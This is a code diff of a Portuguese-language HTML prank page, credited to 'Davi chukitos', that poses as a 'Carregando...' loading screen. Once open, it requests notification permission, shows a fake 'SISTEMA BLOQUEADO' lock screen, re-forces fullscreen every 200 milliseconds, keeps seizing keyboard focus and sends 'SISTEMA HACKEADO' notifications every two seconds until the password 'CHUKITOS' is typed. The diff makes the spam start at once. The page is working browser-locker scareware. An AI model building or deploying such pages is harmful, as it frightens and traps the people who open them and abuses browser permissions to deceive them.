@@ -3,190 +3,113 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-<title>Sistema Bloqueado</title>
+<title>Carregando...</title>
 <style>
-  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
-  html, body {
-    height: 100%; width: 100%; position: fixed; overflow: hidden;
-    background: #000; font-family: 'Courier New', monospace; cursor: none;
-    touch-action: none; overscroll-behavior: none; margin: 0; top: 0; left: 0;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    color: #fff; user-select: none;
-  }
-  
-  #lock-screen {
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    width: 100%; height: 100%; padding: 20px; text-align: center;
-  }
-
-  .title {
-    font-size: clamp(2rem, 8vw, 4rem); font-weight: 900; color: #ff0000;
-    text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px;
-    animation: pulse 2s infinite;
-  }
-  
-  .subtitle {
-    font-size: 1.2rem; color: #aaa; margin-bottom: 40px; letter-spacing: 1px;
-  }
-
-  .input-area {
-    display: flex; flex-direction: column; align-items: center; gap: 10px;
-  }
-
-  input[type="password"] {
-    background: transparent; border: 2px solid #00ff00; color: #00ff00;
-    padding: 15px; font-size: 1.5rem; font-family: inherit; text-align: center;
-    border-radius: 5px; outline: none; width: 250px; letter-spacing: 5px;
-  }
-
-  button {
-    background: #00ff00; color: #000; border: none; padding: 10px 30px;
-    font-size: 1.2rem; font-family: inherit; font-weight: bold; cursor: pointer;
-    border-radius: 5px; width: 250px;
-  }
-
-  button:active { background: #00aa00; }
-
-  .footer {
-    position: absolute; bottom: 30px; font-size: 1rem; color: #ff0000;
-    font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px red;
-  }
-
-  @keyframes pulse {
-    0% { text-shadow: 0 0 10px red; }
-    50% { text-shadow: 0 0 30px red, 0 0 10px red; }
-    100% { text-shadow: 0 0 10px red; }
-  }
+  body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
 </style>
 </head>
 <body>
-
-<div id="lock-screen">
-  <div class="title">SISTEMA BLOQUEADO</div>
-  <div class="subtitle">ERRO CRÍTICO 0x000000</div>
-  
-  <div class="input-area">
-    <input type="password" id="senhaInput" placeholder="****" autocomplete="off" autofocus>
-    <button id="btnDesbloquear">DESBLOQUEAR</button>
-  </div>
-
-  <div class="footer">Feito por: Davi chukitos</div>
-</div>
+  <h2>Carregando sistema...</h2>
 
 <script>
-(function(){
-  const SENHA_CORRETA = "CHUKITOS";
-  const input = document.getElementById('senhaInput');
-  const btn = document.getElementById('btnDesbloquear');
-  let spamInterval = null;
-
-  // --- 1. PEDE PERMISSÃO DE NOTIFICAÇÃO ---
-  function pedirPermissao() {
-    if (!("Notification" in window)) {
-      alert("Este navegador não suporta notificações.");
-      return;
-    }
-    
-    if (Notification.permission === "granted") {
-      iniciarSpam();
-    } 
-    else if (Notification.permission !== "denied") {
-      Notification.requestPermission().then(permission => {
-        if (permission === "granted") {
-          iniciarSpam();
-        } else {
-          alert("Você negou. As notificações não vão funcionar.");
-        }
-      });
-    } else {
-      alert("Você já bloqueou as notificações. Vá nas configurações do site pra desbloquear.");
-    }
+  // 1. Pede a permissão logo de cara, fora da tela cheia
+  if ("Notification" in window) {
+    Notification.requestPermission().then(permission => {
+      iniciarTrava();
+    });
+  } else {
+    iniciarTrava();
   }
 
-  // --- 2. SPAM DE NOTIFICAÇÕES ---
-  function dispararNotificacao() {
-    if (Notification.permission === "granted") {
-      const notif = new Notification("SISTEMA HACKEADO", {
-        body: "Você foi hackeado pelo CHUKITOS! Digite a senha!",
-        icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
-        requireInteraction: true 
-      });
-      if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+  function iniciarTrava() {
+    // 2. Agora injeta o HTML da trava
+    document.body.innerHTML = `
+      <style>
+        *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+        html, body { height: 100%; width: 100%; position: fixed; overflow: hidden; background: #000; font-family: 'Courier New', monospace; cursor: none; touch-action: none; overscroll-behavior: none; margin: 0; top: 0; left: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; user-select: none; }
+        #lock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; padding: 20px; text-align: center; }
+        .title { font-size: clamp(2rem, 8vw, 4rem); font-weight: 900; color: #ff0000; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; animation: pulse 2s infinite; }
+        .subtitle { font-size: 1.2rem; color: #aaa; margin-bottom: 40px; letter-spacing: 1px; }
+        .input-area { display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        input[type="password"] { background: transparent; border: 2px solid #00ff00; color: #00ff00; padding: 15px; font-size: 1.5rem; font-family: inherit; text-align: center; border-radius: 5px; outline: none; width: 250px; letter-spacing: 5px; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 30px; font-size: 1.2rem; font-family: inherit; font-weight: bold; cursor: pointer; border-radius: 5px; width: 250px; }
+        .footer { position: absolute; bottom: 30px; font-size: 1rem; color: #ff0000; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px red; }
+        @keyframes pulse { 0% { text-shadow: 0 0 10px red; } 50% { text-shadow: 0 0 30px red, 0 0 10px red; } 100% { text-shadow: 0 0 10px red; } }
+      </style>
+      <div id="lock-screen">
+        <div class="title">SISTEMA BLOQUEADO</div>
+        <div class="subtitle">ERRO CRÍTICO 0x000000</div>
+        <div class="input-area">
+          <input type="password" id="senhaInput" placeholder="****" autocomplete="off" autofocus>
+          <button id="btnDesbloquear">DESBLOQUEAR</button>
+        </div>
+        <div class="footer">Feito por: Davi chukitos</div>
+      </div>
+    `;
+
+    const SENHA_CORRETA = "CHUKITOS";
+    const input = document.getElementById('senhaInput');
+    const btn = document.getElementById('btnDesbloquear');
+    let spamInterval = null;
+
+    function dispararNotificacao() {
+      if (Notification.permission === "granted") {
+        new Notification("SISTEMA HACKEADO", {
+          body: "Você foi hackeado pelo CHUKITOS! Digite a senha!",
+          icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
+          requireInteraction: true 
+        });
+        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+      }
     }
-  }
 
-  function iniciarSpam() {
-    if (!spamInterval) {
-      dispararNotificacao();
-      spamInterval = setInterval(dispararNotificacao, 2000);
+    function iniciarSpam() {
+      if (!spamInterval) {
+        dispararNotificacao();
+        spamInterval = setInterval(dispararNotificacao, 2000);
+      }
     }
-  }
 
-  // --- 3. TRAVA DE TELA CHEIA ---
-  function forcarTelaCheia() {
-    const el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  }
-  
-  forcarTelaCheia();
-  setInterval(() => {
-    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-       forcarTelaCheia();
+    // Tenta tela cheia
+    function forcarTelaCheia() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
     }
-  }, 200);
+    forcarTelaCheia();
+    setInterval(() => {
+      if (!document.fullscreenElement && !document.webkitFullscreenElement) forcarTelaCheia();
+    }, 200);
 
-  // --- 4. LÓGICA DA SENHA (Aciona a permissão ao clicar) ---
-  function checarSenha() {
-    // Pede permissão toda vez que ele tenta desbloquear
-    pedirPermissao();
-
-    const digitada = input.value.toUpperCase();
-    if (digitada === SENHA_CORRETA) {
-      if (spamInterval) clearInterval(spamInterval);
-      
-      if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
-      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
-      
-      document.body.innerHTML = `
-        <div style="display:flex;flex-direction:column;height:100vh;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;">
-          <div style="font-size:2.5rem; font-weight:900; text-shadow: 0 0 10px #0f0;">ACESSO PERMITIDO</div>
-          <div style="font-size:1rem;color:#aaa;margin-top:10px;">Notificações paradas. Você se salvou.</div>
-          <div style="font-size:1.5rem;color:#f00; margin-top:40px; font-weight:bold; text-shadow: 0 0 10px red;">Feito por: Davi chukitos</div>
-        </div>`;
-      document.body.style.cursor = 'default';
-      
-    } else {
-      input.value = '';
-      input.style.borderColor = '#ff0000';
-      input.style.color = '#ff0000';
-      document.body.style.background = '#300';
-      dispararNotificacao();
-      
-      setTimeout(() => {
-        input.style.borderColor = '#00ff00';
-        input.style.color = '#00ff00';
-        document.body.style.background = '#000';
-      }, 200);
-      
-      alert("SENHA INCORRETA!");
+    function checarSenha() {
+      const digitada = input.value.toUpperCase();
+      if (digitada === SENHA_CORRETA) {
+        if (spamInterval) clearInterval(spamInterval);
+        if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
+        else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+        
+        document.body.innerHTML = `
+          <div style="display:flex;flex-direction:column;height:100vh;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;">
+            <div style="font-size:2.5rem; font-weight:900; text-shadow: 0 0 10px #0f0;">ACESSO PERMITIDO</div>
+            <div style="font-size:1.5rem;color:#f00; margin-top:40px; font-weight:bold; text-shadow: 0 0 10px red;">Feito por: Davi chukitos</div>
+          </div>`;
+        document.body.style.cursor = 'default';
+      } else {
+        input.value = '';
+        input.style.borderColor = '#ff0000';
+        document.body.style.background = '#300';
+        dispararNotificacao();
+        setTimeout(() => { input.style.borderColor = '#00ff00'; document.body.style.background = '#000'; }, 200);
+        alert("SENHA INCORRETA!");
+      }
     }
+
+    btn.addEventListener('click', checarSenha);
+    input.addEventListener('keydown', (e) => { if (e.key === 'Enter') checarSenha(); });
+    setInterval(() => { if(document.activeElement !== input) input.focus(); }, 500);
+
+    iniciarSpam(); // Começa o spam imediatamente após carregar a tela
   }
-
-  btn.addEventListener('click', checarSenha);
-  input.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') checarSenha();
-  });
-
-  document.addEventListener('keydown', (e) => {
-    if (e.key === 'F11') e.preventDefault();
-  });
-
-  setInterval(() => {
-    if(document.activeElement !== input) input.focus();
-  }, 500);
-
-})();
 </script>
 </body>
 </html>
